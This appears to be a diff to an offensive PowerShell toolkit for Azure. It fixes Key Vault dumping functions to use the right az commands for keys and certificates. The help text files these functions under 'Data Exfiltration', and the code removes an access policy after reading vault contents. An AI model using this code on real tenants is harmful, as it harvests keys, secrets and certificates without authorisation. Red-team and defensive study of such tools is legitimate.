@@ -213,7 +213,7 @@ Get-RunAsAccounts ------ Finds any RunAs accounts being used by an Automation Ac
 -----------------Data Exfiltration--------------
 Get-KeyVaults ---------- Lists the Key Vaults
 Get-KeyVaultContents --- Get the keys, secrets, and certificates from a specific Key Vault
-Get-AllKeyVaultContents -Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to           
+Get-VaultContents -Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to           
 Get-StorageAccounts ---- Gets all storage accounts
 Get-StorageAccountKeys - Gets the account keys for a storage account
 Get-StorageContents ---- Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
@@ -836,12 +836,12 @@ function Get-KeyVaultContents
 		ForEach ($kid in $kids)
 		{
 			$kid
-			az keyvault secret show --id $kid -o table
+			az keyvault key show --id $kid -o table
 		}
 		ForEach ($cid in $cids)
 		{
 			$cid
-			az keyvault secret show --id $cid -o table
+			az keyvault certificate show --id $cid -o table
 		}
 		$removeaccess = az keyvault delete-policy --name $Vault --upn $User
 	}
@@ -877,13 +877,13 @@ function Get-AllKeyVaultContents
 		ForEach ($kid in $kids)
 		{
 			Write-Host "Vault: " $kid
-			az keyvault secret show --id $kid -o table
+			az keyvault key show --id $kid -o table
 			Write-Host ""
 		}
 		ForEach ($cid in $cids)
 		{
 			Write-Host "Vault: " $cid
-			az keyvault secret show --id $cid -o table
+			az keyvault certificate show --id $cid -o table
 			Write-Host ""
 		}
 		$removeaccess = az keyvault delete-policy --name $vault --upn $User
